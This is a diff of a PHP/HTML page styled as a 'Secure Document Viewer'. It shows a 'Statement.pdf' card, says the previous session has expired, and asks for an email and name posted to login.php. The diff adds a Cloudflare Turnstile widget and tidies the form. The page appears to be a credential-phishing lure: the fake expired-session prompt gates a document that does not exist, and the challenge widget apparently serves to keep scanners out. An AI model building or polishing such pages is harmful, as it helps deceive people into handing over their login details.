@@ -2,10 +2,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Secure Document Viewer</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <style>
+<meta charset="UTF-8">
+<title>Secure Document Viewer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Cloudflare Turnstile JS -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<style>
         /* Global reset / basics */
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -203,21 +207,24 @@
         <img src="assets/background.png" alt="Document preview">
     </div>
 
-   <div class="login-card">
-    <div class="doc-icon">
-        <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
-    </div>
+    <div class="login-card">
+        <div class="doc-icon">
+            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
+        </div>
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
         <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
-     
 
         <?php if (!empty($_SESSION['error_message'])): ?>
-            <p class="login-error"><?= $_SESSION['error_message']; ?></p>
-            <?php unset($_SESSION['error_message']); ?>
+            <p class="login-error"><?= $_SESSION['error_message']; unset($_SESSION['error_message']); ?></p>
         <?php endif; ?>
 
         <form class="login-form" method="POST" action="login.php" autocomplete="off">
+            <!-- Turnstile widget -->
+            <div class="field-wrapper">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
+            </div>
+
             <label class="field-label" for="email"></label>
             <div class="field-wrapper">
                 <input id="email" name="email" type="email"
@@ -227,7 +234,7 @@
 
             <label class="field-label" for="name">Name</label>
             <div class="field-wrapper">
-                <input id="name" name="name" type="name" placeholder="Enter your name" required>
+                <input id="name" name="name" type="text" placeholder="Enter your name" required>
             </div>
 
             <button type="submit" class="btn-primary">Next</button>
